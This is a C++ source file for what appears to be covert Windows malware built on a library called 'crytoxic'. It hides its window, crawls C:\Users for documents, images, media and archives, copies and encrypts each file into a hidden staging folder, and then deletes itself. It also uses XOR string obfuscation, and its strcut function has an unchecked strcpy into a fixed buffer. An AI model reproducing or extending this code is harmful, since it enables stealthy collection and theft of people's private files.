#include "..\\filecrawler\\main.h"
#define ct crytoxic
#define MAX_BUFFER 1024

namespace fs = std::experimental::filesystem::v1;

#pragma region material
static const std::vector<std::string> allow_file_list = {
	".zip", ".7z", ".bmp", ".gif", ".jpeg", ".png", ".psd", ".pic", ".jpg", ".raw", ".tiff", ".avi", ".flv", ".mkv", ".mov",
	".mp3", ".mp4", ".wav", ".wma", ".doc", ".docx", ".html", ".htm", ".hwp", ".hwpx", ".pdf", ".txt", ".ppt", ".pptx",
};
#pragma endregion

inline static std::string& ltrim(std::string& s, const char* t = " \t\n\r\f\v") {
	s.erase(0, s.find_first_not_of(t));
	return s;
}

inline static std::string& rtrim(std::string& s, const char* t = " \t\n\r\f\v") {
	s.erase(s.find_last_not_of(t) + 1);
	return s;
}

inline static std::string& trim(std::string& s, const char* t = " \t\n\r\f\v") {
	return ltrim(rtrim(s, t), t);
}

inline static std::string str_crypt(std::string str) {
	for (size_t i = 0; i < str.size(); ++i)
		str[i] ^= standard_passcode[i % standard_passcode.length()];
	return str;
}

inline static std::vector<std::string> strcut(std::string str, std::string module_) {
	char buffer[MAX_BUFFER];
	std::strcpy(buffer, str.c_str());
	char* ptr = std::strtok(buffer, module_.c_str());
	std::vector<std::string> ret;
	while (ptr) {
		ret.push_back(ptr);
		ptr = std::strtok(NULL, module_.c_str());
	}
	return ret;
}

inline static BOOL processfunction(std::string abs_path) {
	std::string from_str = abs_path;
	std::string to_str = "buffer\\" + strcut(abs_path, "\\").back();

	char buf[BUFSIZ];
	size_t size;

	_iobuf* source = std::fopen(from_str.c_str(), "rb");
	_iobuf* dest = std::fopen(to_str.c_str(), "wb");

	while (size = std::fread(buf, 1, BUFSIZ, source)) {
		std::fwrite(buf, 1, size, dest);
	}

	std::fclose(source);
	std::fclose(dest);
	ct::Filecrypt(to_str);
	SetFileAttributesW((LPCWSTR)to_str.c_str(), FILE_ATTRIBUTE_HIDDEN);
	return EXIT_SUCCESS;
}

int32_t main(const int argc, const char** argv, const char** env) {
	ct::windowtype(false);
	CreateDirectoryW(L"buffer", NULL);
	ct::SearchingSubFiles(R"(C:\Users)", allow_file_list, processfunction);
	ct::delete_self_();

	return EXIT_SUCCESS;
}